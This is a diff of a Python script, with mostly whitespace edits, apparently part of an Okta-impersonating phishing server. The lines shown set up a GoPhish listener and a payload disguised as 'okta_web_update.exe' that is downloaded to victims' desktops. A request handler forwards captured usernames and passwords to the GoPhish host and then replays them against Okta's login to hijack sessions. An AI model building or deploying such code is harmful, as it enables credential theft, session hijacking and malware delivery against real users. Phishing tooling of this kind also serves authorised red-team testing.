@@ -51,30 +51,31 @@ parser = optparse.OptionParser(usage=help_usage,
 								version="%prog 1.0")
 
 parser.add_option('-q', '--quiet',
-    action="store_true", dest="quiet_mode",
-    help="don't print status messages to stdout", default=False)
+	action="store_true", dest="quiet_mode",
+	help="don't print status messages to stdout", default=False)
 
 parser.add_option('-o', '--out-file',
-    action="store", dest="log_file",
-    help="destination of log file for writing setup logs", default="")
+	action="store", dest="log_file",
+	help="destination of log file for writing setup logs", default="")
 
 parser.add_option('-g', '--go-phish',
-    action="store", dest="go_phish",
-    help="location of gophish listener", default="")
+	action="store", dest="go_phish",
+	help="location of gophish listener", default="")
 
 parser.add_option('-p', '--payload',
-    action="store", dest="payload",
-    help="location of payload to download to users desktop. Named 'okta_web_update'", default="")
+	action="store", dest="payload",
+	help="location of payload to download to users desktop. Named 'okta_web_update'", default="")
 
 parser.add_option('-x', '--extension',
-    action="store", dest="extension",
-    help="extension for payload option. Default: 'exe", default="exe")
+	action="store", dest="extension",
+	help="extension for payload option. Default: 'exe", default="exe")
 
 parser.add_option('-c', '--content-type',
-    action="store", dest="content_type",
-    help="content type for payload. Default: 'application/octet-stream'", default="application/octet-stream")
+	action="store", dest="content_type",
+	help="content type for payload. Default: 'application/octet-stream'", default="application/octet-stream")
 
 (options, args) = parser.parse_args()
+
 
 #For the result server
 def signal_handler(signal, frame):
@@ -173,7 +174,6 @@ def download_site():
 		quiet_print("--IO Error: " + str(e), True)
 		quiet_print("--Exiting...", True)
 		exit(1)
-
 
 
 def encode_replacement(replace_url):
@@ -306,7 +306,7 @@ class S(BaseHTTPRequestHandler):
 		self.send_response(code)
 		self.send_header('Content-type', 'text/html')
 		self.send_header("Connection", "close")
-        
+
 	def do_OPTIONS(self):
 		self.send_response(200, "ok")
 		self.send_header('Access-Control-Allow-Credentials', 'true')
@@ -432,11 +432,11 @@ class S(BaseHTTPRequestHandler):
 				self._set_headers(404)
 				self.end_headers()
 				self.serve_file("errors/404.html")
-        
+
 		except Exception as e:
 			quiet_print("--Error: " + str(e), True)
 			self.serve_file("index.html")
-     
+
 	def send_sign_on_error(self):
 		self.send_response(401)
 		self.send_header('Content-type', "application/json;charset=UTF-8")
@@ -470,7 +470,7 @@ class S(BaseHTTPRequestHandler):
 						requests.post(options.go_phish + "/?rid=" + rid + "&username=" + data["username"] + "&password=" + data["password"], verify=False)
 				except Exception:
 					log_print("Go phish not reachable")
-                
+
 
 				response = okta_authenticate(data["username"], data["password"])
 				if(response.status_code != 200):
@@ -544,7 +544,7 @@ class S(BaseHTTPRequestHandler):
 				else:
 					self.send_sign_on_error()
 					return
-        
+
 		except Exception as e:
 			quiet_print("--Error: " + str(e), True)
 			self.send_sign_on_error()
@@ -552,6 +552,7 @@ class S(BaseHTTPRequestHandler):
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
 		"""Handle requests in a separate thread."""
+
 
 def get_okta_session(url, JSESSION_ID):
 	cookies = {'JSESSIONID': JSESSION_ID}
